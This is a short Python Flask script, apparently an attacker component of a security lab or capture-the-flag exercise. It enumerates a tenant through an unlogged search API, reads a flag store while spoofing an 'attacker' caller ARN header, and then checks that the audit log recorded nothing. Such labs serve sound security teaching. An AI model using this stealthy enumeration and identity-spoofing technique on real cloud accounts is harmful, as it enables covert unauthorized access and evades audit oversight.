"""Quiet enumeration: map the whole tenant with an unlogged search API."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
EXPLORER = os.environ.get("EXPLORER_URL", "http://explorer-api:5000")
AUDIT = os.environ.get("AUDIT_URL", "http://audit-log:5000")
CALLER = os.environ.get("CALLER_ARN", "arn:aws:iam::111122223333:user/attacker")

HTML = """<h1>Quiet Resource Enumeration</h1>
<form method="post" action="/run"><button>Run</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    for q in ["", "prod", "role", "flag"]:
        r = requests.get(f"{EXPLORER}/search", params={"q": q}, timeout=8)
        log.append(f"[search q='{q}'] {r.text}")
    r = requests.get(f"{EXPLORER}/resources/s-001",
                     headers={"X-Caller-ARN": CALLER}, timeout=8)
    log.append(f"[read flag-store] {r.text}")
    logs = requests.get(f"{AUDIT}/logs", timeout=8).json()
    log.append(f"[audit entries] {logs['count']} -- enumeration was invisible")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
